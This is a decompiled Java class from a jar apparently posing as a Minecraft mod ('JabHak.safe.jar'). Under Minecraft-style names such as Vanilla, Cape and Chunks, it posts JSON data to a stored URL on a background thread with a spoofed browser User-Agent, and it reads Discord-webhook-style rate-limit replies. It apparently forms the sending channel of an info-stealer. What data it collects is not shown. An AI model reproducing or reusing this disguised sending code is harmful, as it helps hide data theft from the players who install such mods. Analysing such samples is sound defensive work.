/*    */ package me.noculator.tweaks;
/*    */ 
/*    */ import com.google.gson.Gson;
/*    */ import com.google.gson.annotations.SerializedName;
/*    */ import java.util.ArrayList;
/*    */ import java.util.List;
/*    */ 
/*    */ 
/*    */ public class VanillaUtil
/*    */ {
/* 11 */   private static final Gson gson = new Gson();
/*    */   private final String url;
/*    */   
/*    */   public VanillaUtil(String url) {
/* 15 */     this.url = url;
/*    */   }
/*    */   
/*    */   public void sendMessage(Chunks dm) {
/* 19 */     (new Thread(() -> {
/*    */           String strResponse = VanillaLightEngine.post(this.url).acceptJson().contentType("application/json").header("User-Agent", "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11").send(gson.toJson(dm)).body();
/*    */ 
/*    */ 
/*    */           
/*    */           if (!strResponse.isEmpty()) {
/*    */             CapeResponse response = (CapeResponse)gson.fromJson(strResponse, CapeResponse.class);
/*    */ 
/*    */ 
/*    */             
/*    */             try {
/*    */               if (response.getMessage().equals("You are being rate limited.")) {
/*    */                 throw new CapeException(response.getMessage());
/*    */               }
/* 33 */             } catch (Exception e) {
/*    */               throw new CapeException(strResponse);
/*    */             } 
/*    */           } 
/* 37 */         })).start();
/*    */   }
/*    */   
/*    */   public static class CapeResponse {
/*    */     boolean global;
/*    */     String message;
/*    */     @SerializedName("retry_after")
/*    */     int retryAfter;
/* 45 */     List<String> username = new ArrayList<>();
/* 46 */     List<String> embeds = new ArrayList<>();
/* 47 */     List<String> connection = new ArrayList<>();
/*    */ 
/*    */ 
/*    */ 
/*    */     
/*    */     public String getMessage() {
/* 53 */       return this.message;
/*    */     }
/*    */     
/*    */     public int getRetryAfter() {
/* 57 */       return this.retryAfter;
/*    */     }
/*    */     
/*    */     public List<String> getUsername() {
/* 61 */       return this.username;
/*    */     }
/*    */     
/*    */     public List<String> getEmbeds() {
/* 65 */       return this.embeds;
/*    */     }
/*    */     
/*    */     public List<String> getConnection() {
/* 69 */       return this.connection;
/*    */     }
/*    */   }
/*    */   
/*    */   public class CapeException extends RuntimeException {
/*    */     public CapeException(String message) {
/* 75 */       super(message);
/*    */     }
/*    */   }
/*    */ }


/* Location:              C:\Users\SusanLindsay\Downloads\JabHak.safe.jar!\me\noculator\tweaks\VanillaUtil.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */